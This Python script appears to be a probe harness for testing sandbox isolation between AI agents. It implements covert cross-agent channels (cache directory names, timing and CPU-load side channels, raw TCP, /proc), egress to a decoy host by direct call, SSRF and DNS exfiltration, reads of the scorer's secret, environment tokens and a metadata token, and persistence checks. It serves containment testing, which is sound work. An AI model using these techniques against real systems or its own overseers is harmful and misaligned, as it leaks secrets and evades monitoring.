#!/usr/bin/env python3
"""In-sandbox probes. Usage: probe.py <name> send|recv --tag T [--payload P]

Probes are synthetic: they carry a random marker through a feature that is
already exposed. `recv` is given only the public tag, never the payload, and
prints what it found as JSON. The orchestrator does the scoring.
"""
import argparse
import json
import multiprocessing
import os
import pathlib
import re
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

CACHE = "http://cache:8080"
DECOY = "http://decoy:8000"
TIMEOUT = 2.0
BITS = 32
SLOT = float(os.environ.get("CPU_SLOT", "0.25"))
NO_PROXY = urllib.request.build_opener(urllib.request.ProxyHandler({}))


def http(url, method="GET", data=None, headers=None, timeout=TIMEOUT):
    request = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with NO_PROXY.open(request, timeout=timeout) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as error:
        return error.code, ""
    except (OSError, ValueError):
        return 0, ""


def remote(url):
    return f"{CACHE}/remote?url={urllib.parse.quote(url, safe='')}"


def bits(payload):
    return [(int(payload, 16) >> (BITS - 1 - i)) & 1 for i in range(BITS)]


def hexbits(values):
    number = 0
    for value in values:
        number = (number << 1) | value
    return f"{number:0{BITS // 4}x}"


# Cross-agent channels ------------------------------------------------------

def dirname_send(tag, payload):
    http(f"{CACHE}/repo/board/zz_{tag}_{payload}", "MKCOL")


def dirname_recv(tag):
    code, body = http(f"{CACHE}/list/board")
    if code == 200:
        for name in json.loads(body):
            if name.startswith(f"zz_{tag}_"):
                return name.split("_", 2)[2]


def upload_send(tag, payload):
    credential = os.environ.get("CACHE_CREDENTIAL", "")
    http(f"{CACHE}/repo/up/{tag}", "PUT", payload.encode(), {"Authorization": f"Bearer {credential}"})


def upload_recv(tag):
    code, body = http(f"{CACHE}/repo/up/{tag}")
    return body if code == 200 else None


def props_send(tag, payload):
    http(f"{CACHE}/props/{tag}?v={payload}", "POST", b"")


def props_recv(tag):
    code, body = http(f"{CACHE}/props/{tag}")
    return body if code == 200 else None


def cachefill_send(tag, payload):
    http(f"{CACHE}/repo/fill-{tag}/{payload}")


def cachefill_recv(tag):
    code, body = http(f"{CACHE}/list/fill-{tag}")
    if code == 200:
        names = json.loads(body)
        if names:
            return names[0].removesuffix(".miss")


def presence_send(tag, payload):
    for index, bit in enumerate(bits(payload)):
        if bit:
            http(f"{CACHE}/repo/pkg-{tag}-{index}")


def presence_recv(tag):
    """Read bits from fetch latency alone: no listing, no cached misses."""
    timings = []
    for index in range(BITS):
        start = time.perf_counter()
        code, _ = http(f"{CACHE}/repo/pkg-{tag}-{index}")
        timings.append((time.perf_counter() - start, code))
    if not any(code == 200 for _, code in timings):
        return None
    threshold = float(os.environ.get("PRESENCE_MS", "30")) / 1000
    return hexbits([1 if elapsed < threshold else 0 for elapsed, _ in timings])


def dead_drop_send(tag, payload):
    http(remote(f"{DECOY}/drop/{tag}?v={payload}"))


def dead_drop_recv(tag):
    code, body = http(remote(f"{DECOY}/drop/{tag}"))
    return body if code == 200 and body else None


def direct_tcp_send(tag, payload):
    try:
        with socket.create_connection(("agent_b", 9999), timeout=TIMEOUT) as sock:
            sock.sendall(f"{tag} {payload}".encode())
    except OSError:
        pass


def direct_tcp_recv(tag):
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 9999))
    server.listen(1)
    server.settimeout(3)
    try:
        connection, _ = server.accept()
        words = connection.recv(256).decode().split()
        return words[1] if len(words) == 2 and words[0] == tag else None
    except OSError:
        return None
    finally:
        server.close()


def shared_fs_send(tag, payload):
    try:
        pathlib.Path(f"/shared/{tag}").write_text(payload)
    except OSError:
        pass


def shared_fs_recv(tag):
    path = pathlib.Path(f"/shared/{tag}")
    return path.read_text() if path.is_file() else None


def proc_send(tag, payload):
    subprocess.Popen(
        [sys.executable, "-c", "import time;time.sleep(4)", f"sbdproc_{tag}_{payload}"],
        stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        start_new_session=True,
    )


def proc_recv(tag):
    time.sleep(0.5)
    for entry in pathlib.Path("/proc").iterdir():
        if entry.name.isdigit():
            try:
                match = re.search(rf"sbdproc_{tag}_(\w+)", (entry / "cmdline").read_text())
            except OSError:
                continue
            if match:
                return match.group(1)


def log_read_send(tag, payload):
    http(f"http://logs:8081/{tag}", "POST", payload.encode())


def log_read_recv(tag):
    code, body = http(f"http://logs:8081/{tag}")
    return body if code == 200 else None


def spin(deadline):
    while time.time() < deadline:
        pass


def cpu_send(tag, payload, start):
    """Sender loads every CPU it can see during 1-bits and idles during 0-bits."""
    workers = os.cpu_count() or 1
    for index, bit in enumerate(bits(payload)):
        slot_start = start + index * SLOT
        time.sleep(max(0, slot_start - time.time()))
        if bit:
            jobs = [multiprocessing.Process(target=spin, args=(slot_start + SLOT * 0.9,)) for _ in range(workers)]
            for job in jobs:
                job.start()
            for job in jobs:
                job.join()


def cpu_recv(tag, start):
    """Receiver counts loop iterations per slot, then splits at the midpoint."""
    counts = []
    for index in range(BITS):
        slot_start = start + index * SLOT
        time.sleep(max(0, slot_start + SLOT * 0.1 - time.time()))
        deadline, count = slot_start + SLOT * 0.85, 0
        while time.time() < deadline:
            count += 1
        counts.append(count)
    low, high = min(counts), max(counts)
    middle = (low + high) / 2
    return hexbits([1 if value < middle else 0 for value in counts])


# Egress --------------------------------------------------------------------

def egress_direct(payload):
    http(f"{DECOY}/hit/{payload}")


def egress_ssrf(payload):
    http(remote(f"{DECOY}/hit/{payload}"))


def egress_pull_path(payload):
    http(f"{CACHE}/repo/exfil-{payload}")


def egress_dns(payload):
    query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
    for label in (payload, "exfil", "test"):
        query += bytes([len(label)]) + label.encode()
    query += b"\x00\x00\x01\x00\x01"
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(1)
    try:
        sock.sendto(query, ("cache", 5353))
        sock.recv(512)
    except OSError:
        pass
    finally:
        sock.close()


# Control-plane reads and posture -------------------------------------------

def control_scorer_direct():
    code, body = http("http://scorer:9000/secret")
    return body if code == 200 else None


def control_scorer_ssrf():
    code, body = http(remote("http://scorer:9000/secret"))
    return body if code == 200 else None


def control_secret_env():
    found = [value for key, value in os.environ.items() if "SECRET" in key or "TOKEN" in key]
    return found[0] if found else None


def control_metadata():
    code, body = http("http://metadata/latest/token")
    return body if code == 200 else None


def posture_caps():
    text = pathlib.Path("/proc/self/status").read_text()
    return re.search(r"CapBnd:\s+(\w+)", text).group(1)


def posture_docker_sock():
    return "present" if os.path.exists("/var/run/docker.sock") else None


# Persistence ---------------------------------------------------------------

def persist_cache_send(tag, payload):
    dirname_send(tag, payload)
    cachefill_send(tag, payload)


def persist_cache_recv(tag):
    return dirname_recv(tag) or cachefill_recv(tag)


def persist_fs_send(tag, payload):
    pathlib.Path(f"/persist/{tag}").write_text(payload)


def persist_fs_recv(tag):
    path = pathlib.Path(f"/persist/{tag}")
    return path.read_text() if path.is_file() else None


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("name")
    parser.add_argument("role", choices=["send", "recv", "run"])
    parser.add_argument("--tag", default="")
    parser.add_argument("--payload", default="")
    parser.add_argument("--start", type=float, default=0)
    args = parser.parse_args()
    namespace = globals()
    if args.role == "run":
        print(json.dumps({"found": namespace[args.name]()}))
    elif args.name.startswith("egress_"):
        namespace[args.name](args.payload)
    elif args.name == "cpu":
        if args.role == "send":
            cpu_send(args.tag, args.payload, args.start)
        else:
            print(json.dumps({"found": cpu_recv(args.tag, args.start)}))
    elif args.role == "send":
        namespace[f"{args.name}_send"](args.tag, args.payload)
    else:
        print(json.dumps({"found": namespace[f"{args.name}_recv"](args.tag)}))


if __name__ == "__main__":
    main()
